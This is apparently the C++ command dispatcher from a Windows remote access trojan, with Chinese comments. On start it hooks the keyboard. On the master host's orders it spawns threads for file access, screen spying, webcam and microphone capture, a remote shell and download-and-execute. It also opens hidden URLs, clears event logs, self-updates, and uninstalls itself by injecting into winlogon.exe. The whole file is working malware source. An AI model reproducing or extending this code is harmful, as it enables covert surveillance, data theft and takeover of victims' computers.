// KernelManager.cpp: implementation of the CKernelManager class.
//
//////////////////////////////////////////////////////////////////////


#include "KernelManager.h"
#include "loop.h"
#include "until.h"
#include "inject.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

char	CKernelManager::m_strMasterHost[256] = {0};
UINT	CKernelManager::m_nMasterPort = 80;
CKernelManager::CKernelManager(CClientSocket *pClient, LPCTSTR lpszServiceName, DWORD dwServiceType, LPCTSTR lpszKillEvent, 
		LPCTSTR lpszMasterHost, UINT nMasterPort) : CManager(pClient)
{
	/*
//安裝即開始鍵盤記錄
	char	strRecordFile[MAX_PATH];
	GetSystemDirectory(strRecordFile, sizeof(strRecordFile));
	lstrcat(strRecordFile, "\\Kav.key");
	DeleteFile(strRecordFile);
    if (GetFileAttributes(strRecordFile) == -1)
    {
        HANDLE hFile = CreateFile(strRecordFile, GENERIC_WRITE, FILE_SHARE_WRITE, NULL,
                CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        CloseHandle(hFile);
    }
*/
	if (lpszServiceName != NULL)
	{
		lstrcpy(m_strServiceName, lpszServiceName);
	}
	if (lpszKillEvent != NULL)
		lstrcpy(m_strKillEvent, lpszKillEvent);
	if (lpszMasterHost != NULL)
		lstrcpy(m_strMasterHost, lpszMasterHost);

	m_nMasterPort = nMasterPort;
	m_dwServiceType = dwServiceType;
	m_nThreadCount = 0;
	// 初次連接，控制端發送命令表始激活
	m_bIsActived = false;
	// 創建一個監視鍵盤記錄的線程
	// 鍵盤HOOK跟UNHOOK必須在同一個線程中
	m_hThread[m_nThreadCount++] = 
		MyCreateThread(NULL, 0,	(LPTHREAD_START_ROUTINE)Loop_HookKeyboard, NULL, 0,	NULL, true);

}

CKernelManager::~CKernelManager()
{
	for(int i = 0; i < m_nThreadCount; i++)
	{
		TerminateThread(m_hThread[i], -1);
		CloseHandle(m_hThread[i]);
	}
}
// 加上激活
void CKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	switch (lpBuffer[0])
	{
	case COMMAND_ACTIVED:
		InterlockedExchange((LONG *)&m_bIsActived, true);
		break;
	case COMMAND_LIST_DRIVE: // 文件管理
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_FileManager, 
			(LPVOID)m_pClient->m_Socket, 0, NULL, false);
		break;
	case COMMAND_SCREEN_SPY: // 屏幕查看
 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ScreenManager,
 			(LPVOID)m_pClient->m_Socket, 0, NULL, true);
		break;
	case COMMAND_WEBCAM: // 攝像頭
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_VideoManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_AUDIO: // 攝像頭
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_AudioManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_SHELL: // 遠程sehll
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ShellManager, 
			(LPVOID)m_pClient->m_Socket, 0, NULL, true);
		break;
	case COMMAND_KEYBOARD: 
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_KeyboardManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_SYSTEM: 
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_SystemManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;

	case COMMAND_DOWN_EXEC: // 下載者
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_DownManager,
			(LPVOID)(lpBuffer + 1), 0, NULL, true);
		Sleep(100); // 傳遞參數用
		break;
	case COMMAND_OPEN_URL_SHOW: // 顯示打開網頁
		OpenURL((LPCTSTR)(lpBuffer + 1), SW_SHOWNORMAL);
		break;
	case COMMAND_OPEN_URL_HIDE: // 隱藏打開網頁
		OpenURL((LPCTSTR)(lpBuffer + 1), SW_HIDE);
		break;
	case COMMAND_REMOVE: // 卸載,
		UnInstallService();
		break;
	case COMMAND_CLEAN_EVENT: // 清除日誌
		CleanEvent();
		break;
	case COMMAND_Open_3389: // 開3389
		//Open3389p(DWORD (lpBuffer));
		break;
	case COMMAND_OPEN_TEST: // 用戶功能
		MessageBox(NULL,(const char *)lpBuffer,"成功調用",NULL);
		//RegSite(int(lpBuffer));
		break;
	case COMMAND_KILLMBR:   // KILLMBR
		//KillMbr();
		break;
	case COMMAND_SESSION:
		CSystemManager::ShutdownWindows(lpBuffer[1]);
		break;
	case COMMAND_RENAME_REMARK: // 改備註
		SetHostID(m_strServiceName, (LPCTSTR)(lpBuffer + 1));
		break;
	case COMMAND_UPDATE_SERVER: // 更新服務端
		if (UpdateServer((char *)lpBuffer + 1))
			UnInstallService();
		break;
	case COMMAND_REPLAY_HEARTBEAT: // 回覆心跳包
		break;
	}	
}
/////////////////////////////////////////////////////////////
BOOL API_MoveFileA(LPCSTR lpExistingFileName,LPCSTR lpNewFileName)
{
	BOOL result;
	typedef void (WINAPI *lpAddFun)(LPCSTR,LPCSTR);//返回值,形參類型需要參考MSDN
	HINSTANCE hDll=LoadLibrary("kernel32.dll");//函數所在的DLL
	lpAddFun addFun=(lpAddFun)GetProcAddress(hDll,"MoveFileA");//函數名字
	if (addFun != NULL)
	{
		addFun(lpExistingFileName,lpNewFileName);//調用函數
		FreeLibrary(hDll);//釋放句柄
	}
	return result;
}
/////////////////////////////////////////////////////////////////
BOOL API_MoveFileExA(LPCSTR lpExistingFileName,LPCSTR lpNewFileName,DWORD dwFlags)
{
	BOOL result;
	typedef void (WINAPI *lpAddFun)(LPCSTR ,LPCSTR ,DWORD);//返回值,形參類型需要參考MSDN
	HINSTANCE hDll=LoadLibrary("kernel32.dll");//函數所在的DLL
	lpAddFun addFun=(lpAddFun)GetProcAddress(hDll,"MoveFileExA");//函數名字
	if (addFun != NULL)
	{
		addFun(lpExistingFileName,lpNewFileName,dwFlags);//調用函數
		FreeLibrary(hDll);//釋放句柄
	}
	return result;
}
////////////////////////////////////////////////////////////////////////




char GetIEPath[80];
char *IEPath()
{
	char *p;
	char strWinPath[50];
	GetWindowsDirectory(strWinPath,sizeof(strWinPath));
	p = strtok(strWinPath, ":"); 
	if (p)
		wsprintf(GetIEPath,"%s:\\Documents and Settings\\Local User",p);
	return GetIEPath;
}
void CKernelManager::UnInstallService()
{
	char	strServiceDll[MAX_PATH];
	char	strRandomFile[MAX_PATH];

	GetSystemDirectory(strServiceDll, sizeof(strServiceDll));
	lstrcat(strServiceDll, "\\");
	lstrcat(strServiceDll, m_strServiceName);
	lstrcat(strServiceDll, "ex.dll");

	// 裝文件隨機改名，重啟時刪除
	wsprintf(strRandomFile, "%d.bak", GetTickCount());
	MoveFile(strServiceDll, strRandomFile);
	MoveFileEx(strRandomFile, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);

	// 刪除離線記錄文件

	char	strRecordFile[MAX_PATH];
	GetSystemDirectory(strRecordFile, sizeof(strRecordFile));
	lstrcat(strRecordFile, "\\syslog.dat");
	DeleteFile(strRecordFile);
	
	if (m_dwServiceType != 0x120)  // owner的遠程刪除，不能自己停止自己刪除,遠程線程刪除
	{
		InjectRemoveService("winlogon.exe", m_strServiceName);
	}
	else // shared進程的服務,可以刪除自己
	{
		RemoveService(m_strServiceName);
	}
	// 所有操作完成後，通知主線程可以退出
	CreateEvent(NULL, true, false, m_strKillEvent);
}

bool CKernelManager::IsActived()
{
	return	m_bIsActived;	
}